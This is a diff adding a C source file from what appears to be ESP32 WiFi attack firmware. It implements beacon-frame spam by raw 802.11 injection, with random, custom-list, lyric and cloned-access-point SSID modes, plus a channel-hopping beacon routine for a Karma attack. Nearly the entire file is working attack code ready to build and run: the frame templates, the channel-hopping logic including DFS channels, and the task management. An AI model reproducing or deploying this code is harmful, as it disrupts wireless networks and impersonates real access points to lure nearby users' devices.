@@ -1,0 +1,653 @@
+/**
+ * @file beacon_spam.c
+ * @brief Beacon spam attack implementation
+ * 
+ * This module handles WiFi beacon frame spam attacks including:
+ * - Single SSID beacon spam
+ * - Random SSID beacon spam
+ * - Rickroll mode (cycling through Rick Astley lyrics)
+ * - AP list mode (broadcasting all scanned APs)
+ * - Custom SSID list beacon spam
+ * 
+ * Note: This module interfaces with wifi_manager.c for shared state
+ * and WiFi control functions.
+ */
+
+#include "features/wifi/beacon_spam.h"
+#include "managers/wifi_manager.h"
+#include "managers/ap_manager.h"
+#include "managers/ghostchi_manager.h"
+#include "core/system_manager.h"
+#include "managers/ghostscript_runtime.h"
+#include "managers/rgb_manager.h"
+#include "managers/status_display_manager.h"
+#include "managers/settings_manager.h"
+#include "managers/views/terminal_screen.h"
+#include "scans/wifi/wifi_channels.h"
+#include "scans/wifi/hop_profile.h"
+#include "core/glog.h"
+#include "esp_wifi.h"
+#include "esp_log.h"
+#include "esp_random.h"
+#include "freertos/task.h"
+#include "freertos/portmacro.h"
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+// Constants
+#define BEACON_LIST_MAX 16
+#define BEACON_SSID_MAX_LEN 32
+#define RANDOM_SSID_LEN 8
+#define BEACON_RANDOM_BURST 4
+#define BEACON_FRAME_MAX 160
+#define BEACON_FIXED_CHANNEL 6
+static const char *TAG = "BeaconSpam";
+
+// External globals from wifi_manager.c
+extern RGBManager_t rgb_manager;
+extern wifi_ap_record_t *scanned_aps;
+extern uint16_t ap_count;
+// ap_sta_has_ip is now declared in wifi_manager.h
+
+// Settings
+extern FSettings G_Settings;
+
+// Local state
+static char (*g_beacon_list)[BEACON_SSID_MAX_LEN + 1];
+static int g_beacon_list_count = 0;
+static TaskHandle_t beacon_task_handle = NULL;
+static volatile bool beacon_task_running = false;
+static char *beacon_task_ssid = NULL;
+// Channels the driver permanently refused during this run (e.g. DFS in AP
+// mode); skip them instead of retrying and flooding the log every hop.
+// A bitmap keeps this at 32 bytes instead of a 256-byte bool array, which
+// matters on the DRAM-tight ESP32-S2 builds.
+static uint32_t g_tx_channel_unusable[8];
+
+static inline bool tx_channel_unusable(uint8_t ch) {
+    return (g_tx_channel_unusable[ch >> 5] >> (ch & 31)) & 1u;
+}
+
+static inline void mark_tx_channel_unusable(uint8_t ch) {
+    g_tx_channel_unusable[ch >> 5] |= 1u << (ch & 31);
+}
+
+static inline void clear_tx_channel_unusable(void) {
+    memset(g_tx_channel_unusable, 0, sizeof(g_tx_channel_unusable));
+}
+
+// Forward declarations
+static void beacon_spam_task(void *param);
+static void beacon_spam_list_task(void *param);
+static void generate_random_ssid(char *ssid, size_t length);
+
+// Helper function: Generate random SSID
+static void generate_random_ssid(char *ssid, size_t length) {
+    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    for (size_t i = 0; i < length - 1; i++) {
+        int random_index = esp_random() % (sizeof(charset) - 1);
+        ssid[i] = charset[random_index];
+    }
+    ssid[length - 1] = '\0'; // Null-terminate the SSID
+}
+
+static const uint8_t beacon_template[] = {
+    0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source address (set per SSID)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // BSSID (set per SSID)
+    0xc0, 0x6c,                                     // Seq-ctl (set per frame)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (set per frame)
+    0x64, 0x00,                                     // Beacon interval (100 TU)
+    0x11, 0x04,                                     // Capability info (ESS + Privacy)
+    0x00, 0x00,                                     // SSID IE tag, length (set later)
+};
+
+static esp_err_t send_beacon_on_channel(const char *ssid, uint8_t ch) {
+    uint8_t packet[BEACON_FRAME_MAX];
+    memcpy(packet, beacon_template, sizeof(beacon_template));
+
+    char ssid_buffer[RANDOM_SSID_LEN + 1];
+    const char *ssid_to_use = ssid;
+    if (ssid_to_use == NULL) {
+        generate_random_ssid(ssid_buffer, RANDOM_SSID_LEN + 1);
+        ssid_to_use = ssid_buffer;
+    }
+
+    size_t ssid_len = strnlen(ssid_to_use, BEACON_SSID_MAX_LEN);
+
+    uint32_t bssid_hash = 2166136261u;
+    for (uint8_t i = 0; i < ssid_len; i++) {
+        bssid_hash ^= (uint8_t)ssid_to_use[i];
+        bssid_hash *= 16777619u;
+    }
+    packet[10] = 0x02;
+    packet[11] = 0x00;
+    packet[12] = 0x00;
+    packet[13] = (uint8_t)(bssid_hash >> 16);
+    packet[14] = (uint8_t)(bssid_hash >> 8);
+    packet[15] = (uint8_t)bssid_hash;
+    memcpy(&packet[16], &packet[10], 6);
+
+    static uint64_t tsf = 0;
+    static uint16_t seq = 0;
+    tsf += 100000;
+    seq = (seq + 1) & 0x0FFF;
+    memcpy(&packet[24], &tsf, 8);
+    packet[22] = (uint8_t)((seq & 0x000F) << 4);
+    packet[23] = (uint8_t)(seq >> 4);
+
+    packet[37] = ssid_len;
+    memcpy(&packet[38], ssid_to_use, ssid_len);
+
+    uint8_t *supported_rates_ie = &packet[38 + ssid_len];
+    supported_rates_ie[0] = 0x01; // Supported Rates IE tag
+    supported_rates_ie[1] = 0x08; // Length (8 rates)
+    supported_rates_ie[2] = 0x82; // 1 Mbps
+    supported_rates_ie[3] = 0x84; // 2 Mbps
+    supported_rates_ie[4] = 0x8B; // 5.5 Mbps
+    supported_rates_ie[5] = 0x96; // 11 Mbps
+    supported_rates_ie[6] = 0x24; // 18 Mbps
+    supported_rates_ie[7] = 0x30; // 24 Mbps
+    supported_rates_ie[8] = 0x48; // 36 Mbps
+    supported_rates_ie[9] = 0x6C; // 54 Mbps
+
+    uint8_t *ds_param_set_ie = &supported_rates_ie[10];
+    ds_param_set_ie[0] = 0x03; // DS Parameter Set IE tag
+    ds_param_set_ie[1] = 0x01; // Length (1 byte)
+    ds_param_set_ie[2] = ch; // Set the current channel
+
+    uint8_t *rsn_ie = &ds_param_set_ie[3];
+    rsn_ie[0] = 0x30; // RSN IE
+    rsn_ie[1] = 0x14; // Length (20 bytes)
+    rsn_ie[2] = 0x01; rsn_ie[3] = 0x00; // Version 1
+    rsn_ie[4] = 0x00; rsn_ie[5] = 0x0F; rsn_ie[6] = 0xAC; rsn_ie[7] = 0x04; // CCMP group
+    rsn_ie[8] = 0x01; rsn_ie[9] = 0x00; // One pairwise cipher
+    rsn_ie[10] = 0x00; rsn_ie[11] = 0x0F; rsn_ie[12] = 0xAC; rsn_ie[13] = 0x04; // CCMP
+    rsn_ie[14] = 0x01; rsn_ie[15] = 0x00; // One AKM
+    rsn_ie[16] = 0x00; rsn_ie[17] = 0x0F; rsn_ie[18] = 0xAC; rsn_ie[19] = 0x02; // PSK
+    rsn_ie[20] = 0x00; rsn_ie[21] = 0x00; // No RSN capabilities
+
+    size_t packet_size = 38 + ssid_len + 10 + 3 + 22;
+
+    esp_err_t err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), packet, packet_size, false);
+    if (err == ESP_ERR_NO_MEM) {
+        vTaskDelay(pdMS_TO_TICKS(2));
+        err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), packet, packet_size, false);
+    }
+    return err;
+}
+
+// Broadcast a beacon frame for a specific SSID
+esp_err_t beacon_spam_broadcast(const char *ssid) {
+    // Use the active country plan for raw beacon transmission. The TX policy
+    // drops DFS only while an AP interface is running (ESP-IDF rejects AP DFS);
+    // the STA-only attack profile can hop the full plan.
+    uint8_t channels[WIFI_CHANNELS_MAX] = {0};
+    uint8_t channel_count = 0;
+    if (!ap_sta_has_ip) {
+        size_t profile_count = 0;
+        hop_profile_resolve(channels, sizeof(channels), &profile_count);
+        if (profile_count > 0) {
+            channel_count = (uint8_t)profile_count;
+        } else {
+            channel_count = wifi_channels_build_country_list(
+                channels, sizeof(channels));
+        }
+    }
+    if (ap_sta_has_ip) {
+        uint8_t primary_channel;
+        wifi_second_chan_t second_channel;
+        esp_wifi_get_channel(&primary_channel, &second_channel);
+        channels[0] = primary_channel;
+        channel_count = 1;
+    }
+
+    for (uint8_t channel_index = 0;
+         channel_index < channel_count && beacon_task_running;
+         channel_index++) {
+        uint8_t ch = channels[channel_index];
+        if (tx_channel_unusable(ch)) continue;
+        if (!wifi_channels_is_tx_channel(ch)) continue;
+        // Check if we should stop
+        if (!beacon_task_running) {
+            return ESP_OK;
+        }
+        
+        if (!ap_sta_has_ip) {
+            esp_err_t channel_err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            if (channel_err != ESP_OK) {
+                if (channel_err == ESP_ERR_INVALID_ARG ||
+                    channel_err == ESP_ERR_NOT_SUPPORTED) {
+                    mark_tx_channel_unusable(ch);
+                }
+                ESP_LOGW(TAG, "Beacon channel %u unavailable: %s",
+                         (unsigned)ch, esp_err_to_name(channel_err));
+                continue;
+            }
+        }
+
+        // Burst multiple random SSIDs per channel hop to amortize the cost of
+        // the channel switch; fixed SSIDs send once per channel
+        int burst_count = (ssid == NULL) ? BEACON_RANDOM_BURST : 1;
+        for (int b = 0; b < burst_count; b++) {
+            if (!beacon_task_running) {
+                return ESP_OK;
+            }
+            send_beacon_on_channel(ssid, ch);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(1));
+        if (ap_sta_has_ip) break; // only one transmit when a client has IP
+    }
+
+    return ESP_OK;
+}
+
+static esp_err_t beacon_spam_broadcast_multi(const char *const *ssids, size_t count) {
+    if (ssids == NULL || count == 0) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    uint8_t ch = BEACON_FIXED_CHANNEL;
+    if (ap_sta_has_ip) {
+        wifi_second_chan_t second_channel;
+        esp_wifi_get_channel(&ch, &second_channel);
+    } else {
+        if (!wifi_channels_is_tx_channel(ch)) {
+            return ESP_ERR_INVALID_ARG;
+        }
+        esp_err_t channel_err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        if (channel_err != ESP_OK) {
+            ESP_LOGW(TAG, "Beacon channel %u unavailable: %s",
+                     (unsigned)ch, esp_err_to_name(channel_err));
+            return channel_err;
+        }
+    }
+
+    for (size_t i = 0; i < count; i++) {
+        if (!beacon_task_running) {
+            return ESP_OK;
+        }
+        send_beacon_on_channel(ssids[i], ch);
+        vTaskDelay(pdMS_TO_TICKS(1));
+    }
+
+    return ESP_OK;
+}
+
+// Broadcast a beacon frame for Karma attack (uses real AP MAC, hops channels)
+esp_err_t beacon_spam_broadcast_karma(const char *ssid) {
+    if (ssid == NULL) {
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    uint8_t packet[BEACON_FRAME_MAX] = {
+        0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source address (set to AP MAC)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (set to AP MAC)
+        0xc0, 0x6c,                                     // Seq-ctl
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+        0x64, 0x00,                                     // Beacon interval (100 TU)
+        0x11, 0x04,                                     // Capability info (ESS)
+    };
+
+    // Get the real AP MAC address
+    uint8_t ap_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    memcpy(&packet[10], ap_mac, 6);  // Source
+    memcpy(&packet[16], ap_mac, 6);  // BSSID
+
+    // Get current channel for DS parameter set
+    uint8_t primary_channel;
+    wifi_second_chan_t second_channel;
+    esp_wifi_get_channel(&primary_channel, &second_channel);
+
+    uint8_t ssid_len = strlen(ssid);
+    packet[37] = ssid_len;
+    memcpy(&packet[38], ssid, ssid_len);
+
+    uint8_t *supported_rates_ie = &packet[38 + ssid_len];
+    supported_rates_ie[0] = 0x01; // Supported Rates IE tag
+    supported_rates_ie[1] = 0x08; // Length (8 rates)
+    supported_rates_ie[2] = 0x82; // 1 Mbps
+    supported_rates_ie[3] = 0x84; // 2 Mbps
+    supported_rates_ie[4] = 0x8B; // 5.5 Mbps
+    supported_rates_ie[5] = 0x96; // 11 Mbps
+    supported_rates_ie[6] = 0x24; // 18 Mbps
+    supported_rates_ie[7] = 0x30; // 24 Mbps
+    supported_rates_ie[8] = 0x48; // 36 Mbps
+    supported_rates_ie[9] = 0x6C; // 54 Mbps
+
+    uint8_t *ds_param_set_ie = &supported_rates_ie[10];
+    ds_param_set_ie[0] = 0x03; // DS Parameter Set IE tag
+    ds_param_set_ie[1] = 0x01; // Length (1 byte)
+    ds_param_set_ie[2] = primary_channel; // Current channel
+
+    // Add HE Capabilities (for Wi-Fi 6 detection)
+    uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
+    he_capabilities_ie[0] = 0xFF; // Vendor-Specific IE tag
+    he_capabilities_ie[1] = 0x0D; // Length of HE Capabilities
+    he_capabilities_ie[2] = 0x50; // Wi-Fi Alliance OUI byte 1
+    he_capabilities_ie[3] = 0x6f; // OUI byte 2
+    he_capabilities_ie[4] = 0x9A; // OUI byte 3
+    he_capabilities_ie[5] = 0x00;  // HE MAC capabilities
+    he_capabilities_ie[6] = 0x08;  // HE PHY capabilities
+    he_capabilities_ie[7] = 0x00;
+    he_capabilities_ie[8] = 0x00;
+    he_capabilities_ie[9] = 0x40;  // Spatial streams
+    he_capabilities_ie[10] = 0x00;
+    he_capabilities_ie[11] = 0x00;
+    he_capabilities_ie[12] = 0x01; // Wi-Fi 6 capabilities
+
+    size_t packet_size = (38 + ssid_len + 10 + 3 + 13);
+
+    // If AP has connected client, only send on current channel.
+    if (ap_sta_has_ip) {
+        if (!wifi_channels_is_tx_channel(primary_channel)) {
+            return ESP_ERR_INVALID_STATE;
+        }
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+        return err;
+    }
+
+    // Build channel list: user hop profile when set, otherwise the
+    // country-appropriate list.
+    uint8_t channels[WIFI_CHANNELS_MAX];
+    uint8_t channel_count = 0;
+    size_t resolved_count = 0;
+    hop_profile_resolve(channels, sizeof(channels), &resolved_count);
+    if (resolved_count > 0) {
+        channel_count = (uint8_t)resolved_count;
+    } else {
+        channel_count = wifi_channels_build_country_list(channels, sizeof(channels));
+    }
+
+    // Hop through the channel list
+    for (int i = 0; i < channel_count; i++) {
+        uint8_t ch = channels[i];
+        if (!wifi_channels_is_tx_channel(ch)) continue;
+        if (!wifi_manager_karma_is_running()) {
+            return ESP_OK;
+        }
+
+        // The normal C5 AP profile is 20 MHz; do not request HT40 here.
+        wifi_second_chan_t sec_chan = WIFI_SECOND_CHAN_NONE;
+        esp_err_t channel_err = esp_wifi_set_channel(ch, sec_chan);
+        if (channel_err != ESP_OK) continue;
+
+        // Update DS parameter set with current channel
+        ds_param_set_ie[2] = ch;
+
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+
+    // Switch back to AP's operating channel
+    esp_wifi_set_channel(primary_channel, second_channel);
+
+    return ESP_OK;
+}
+
+// Beacon spam task (runs in its own thread)
+static void beacon_spam_task(void *param) {
+    const char *ssid = (const char *)param;
+
+    // Array to store lines of the chorus
+    static const char *rickroll_lyrics[] = {"Never gonna give you up",
+                                     "Never gonna let you down",
+                                     "Never gonna run around",
+                                     "and desert you",
+                                     "Never gonna make you cry",
+                                     "Never gonna say goodbye",
+                                     "Never gonna tell a lie",
+                                     "and hurt you"};
+    const size_t num_lines = sizeof(rickroll_lyrics) / sizeof(rickroll_lyrics[0]);
+
+    int IsRickRoll = ssid != NULL ? (strcmp(ssid, "RICKROLL") == 0) : false;
+    int IsAPList = ssid != NULL ? (strcmp(ssid, "APLISTMODE") == 0) : false;
+
+    while (beacon_task_running) {
+        if (IsRickRoll) {
+            beacon_spam_broadcast_multi(rickroll_lyrics, (size_t)num_lines);
+            vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
+            continue;
+        } else if (IsAPList) {
+            for (int i = 0; i < ap_count; i++) {
+                if (!beacon_task_running) break;  // Check stop flag in inner loop
+                beacon_spam_broadcast((const char *)scanned_aps[i].ssid);
+                vTaskDelay(pdMS_TO_TICKS(10));
+            }
+        } else {
+            beacon_spam_broadcast(ssid);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
+    }
+    
+    // Clear handle before freeing so stop() never frees a param we already own
+    beacon_task_handle = NULL;
+    free(param);
+    vTaskDeleteWithCaps(NULL);
+}
+
+// Beacon list spam task
+static void beacon_spam_list_task(void *param) {
+    (void)param;
+    while (beacon_task_running) {
+        for (int i = 0; i < g_beacon_list_count; ++i) {
+            if (!beacon_task_running) break;  // Check stop flag in inner loop
+            beacon_spam_broadcast(g_beacon_list[i]);
+            vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
+        }
+    }
+    // Clear handle before self-deletion to prevent race condition
+    beacon_task_handle = NULL;
+    vTaskDeleteWithCaps(NULL);
+}
+
+// Start beacon spam with a specific SSID
+void beacon_spam_start(const char *ssid) {
+    if (!beacon_task_running) {
+        // The STA-only attack radio starts the STA driver without associating.
+        // Keep the auto-reconnect worker from trying to join the saved network
+        // (and locking the radio to that AP's channel) while the attack runs.
+        wifi_manager_set_reconnect_hold(true);
+
+        ap_manager_stop_services();
+        glog("Starting beacon transmission...\n");
+        status_display_show_status("Beacon Starting");
+        ghostchi_manager_add_xp(3);
+
+        // Attack radio profile: STA-only. Raw beacon injection works from the
+        // unassociated STA interface, and unlike AP mode it is not barred from
+        // DFS channels ("Set channel to a DFS channel is not allowed in ap
+        // mode"). Starting an AP just to inject also added its own beacon.
+        esp_wifi_stop();
+        vTaskDelay(pdMS_TO_TICKS(50));
+        ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
+
+        // The AP is torn down for the attack, so no station can still hold an
+        // address from it. Clear the stale flag before the hop loop reads it.
+        ap_sta_has_ip = false;
+        clear_tx_channel_unusable();
+        beacon_task_running = true;
+        char *ssid_copy = ssid ? strdup(ssid) : NULL;
+        if (ssid && !ssid_copy) {
+            glog("Failed to allocate SSID copy\n");
+            status_display_show_status("Beacon Start Failed");
+            beacon_task_running = false;
+            esp_wifi_stop();
+            (void)ap_manager_restore_after_attack("beacon start failed");
+            wifi_manager_set_reconnect_hold(false);
+            return;
+        }
+        BaseType_t rc = xTaskCreate_psram(beacon_spam_task, "beacon_task", 3072, (void *)ssid_copy, 5, &beacon_task_handle);
+        if (rc != pdPASS) {
+            glog("Failed to start beacon task (%ld)\n", (long)rc);
+            status_display_show_status("Beacon Start Failed");
+            beacon_task_running = false;
+            beacon_task_handle = NULL;
+            free(ssid_copy);
+            esp_wifi_stop();
+            (void)ap_manager_restore_after_attack("beacon start failed");
+            wifi_manager_set_reconnect_hold(false);
+            return;
+        }
+        beacon_task_ssid = ssid_copy;
+        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
+        ghostscript_emit_event("attack_started", "beacon");
+    } else {
+        glog("Beacon transmission already running.\n");
+        status_display_show_status("Beacon Active");
+    }
+}
+
+// Stop beacon spam
+void beacon_spam_stop(void) {
+    if (beacon_task_running) {
+        glog("Stopping beacon transmission...\n");
+
+        // Signal the task to stop
+        beacon_task_running = false;
+        
+        // Wait for the task to delete itself (task clears handle and calls vTaskDeleteWithCaps(NULL))
+        // Maximum wait time: 2 seconds (task should exit much faster)
+        int wait_count = 0;
+        while (beacon_task_handle != NULL && wait_count < 20) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            wait_count++;
+        }
+
+        if (beacon_task_handle != NULL) {
+            vTaskDeleteWithCaps(beacon_task_handle);
+            beacon_task_handle = NULL;
+            if (beacon_task_ssid) {
+                free(beacon_task_ssid);
+                beacon_task_ssid = NULL;
+            }
+        }
+        beacon_task_ssid = NULL;
+
+        // Turn off RGB indicator
+        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
+
+        // Stop WiFi completely
+        esp_err_t stop_err = esp_wifi_stop();
+        if (stop_err != ESP_OK) {
+            glog("Beacon stop warning: failed to stop WiFi (%s)\n", esp_err_to_name(stop_err));
+        }
+
+        // Restore the normal AP profile (STA-only attack radio is dropped)
+        (void)ap_manager_restore_after_attack("beacon stop");
+        wifi_manager_set_reconnect_hold(false);
+        status_display_show_status("Beacon Stopped");
+        ghostscript_emit_event("attack_stopped", "beacon");
+    }
+}
+
+// Start beacon spam using the saved list
+void beacon_spam_start_list(void) {
+    if (g_beacon_list_count == 0) {
+        printf("No SSIDs in beacon list\n");
+        return;
+    }
+    // Ensure any existing beacon spam is stopped
+    beacon_spam_stop();
+    // Notify user that list-based beacon spam is starting
+    glog("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
+
+    // See beacon_spam_start(): do not let the saved network reconnect while
+    // the STA-only attack radio is hopping channels.
+    wifi_manager_set_reconnect_hold(true);
+
+    ap_manager_stop_services();
+
+    // Attack radio profile: STA-only (see beacon_spam_start).
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(50));
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
+
+    ap_sta_has_ip = false;
+    clear_tx_channel_unusable();
+
+    // Launch the beacon list task
+    beacon_task_running = true;
+    BaseType_t rc = xTaskCreate_psram(beacon_spam_list_task, "beacon_list", 3072, NULL, 5, &beacon_task_handle);
+    if (rc != pdPASS) {
+        glog("Failed to start beacon list task (%ld)\n", (long)rc);
+        status_display_show_status("Beacon Start Failed");
+        beacon_task_running = false;
+        beacon_task_handle = NULL;
+        esp_wifi_stop();
+        (void)ap_manager_restore_after_attack("beacon list start failed");
+        wifi_manager_set_reconnect_hold(false);
+        return;
+    }
+    rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
+}
+
+// Add an SSID to the beacon list
+void beacon_spam_add_ssid(const char *ssid) {
+    if (g_beacon_list == NULL) {
+        g_beacon_list = calloc(BEACON_LIST_MAX, sizeof(*g_beacon_list));
+        if (g_beacon_list == NULL) {
+            printf("Unable to allocate beacon list\n");
+            return;
+        }
+    }
+    if (g_beacon_list_count >= BEACON_LIST_MAX) {
+        printf("Beacon list full\n");
+        return;
+    }
+    if (strlen(ssid) > BEACON_SSID_MAX_LEN) {
+        printf("SSID too long\n");
+        return;
+    }
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        if (strcmp(g_beacon_list[i], ssid) == 0) {
+            printf("SSID already in list: %s\n", ssid);
+            return;
+        }
+    }
+    strcpy(g_beacon_list[g_beacon_list_count++], ssid);
+    printf("Added SSID to beacon list: %s\n", ssid);
+}
+
+// Remove an SSID from the beacon list
+void beacon_spam_remove_ssid(const char *ssid) {
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        if (strcmp(g_beacon_list[i], ssid) == 0) {
+            for (int j = i; j < g_beacon_list_count - 1; ++j) {
+                strcpy(g_beacon_list[j], g_beacon_list[j + 1]);
+            }
+            --g_beacon_list_count;
+            printf("Removed SSID from beacon list: %s\n", ssid);
+            return;
+        }
+    }
+    printf("SSID not found in list: %s\n", ssid);
+}
+
+// Clear the beacon list
+void beacon_spam_clear_list(void) {
+    free(g_beacon_list);
+    g_beacon_list = NULL;
+    g_beacon_list_count = 0;
+    printf("Cleared beacon list\n");
+}
+
+// Show the beacon list
+void beacon_spam_show_list(void) {
+    printf("Beacon list (%d entries):\n", g_beacon_list_count);
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        printf("  %d: %s\n", i, g_beacon_list[i]);
+    }
+}
+
+// Check if beacon spam is running
+bool beacon_spam_is_running(void) {
+    return beacon_task_running;
+}
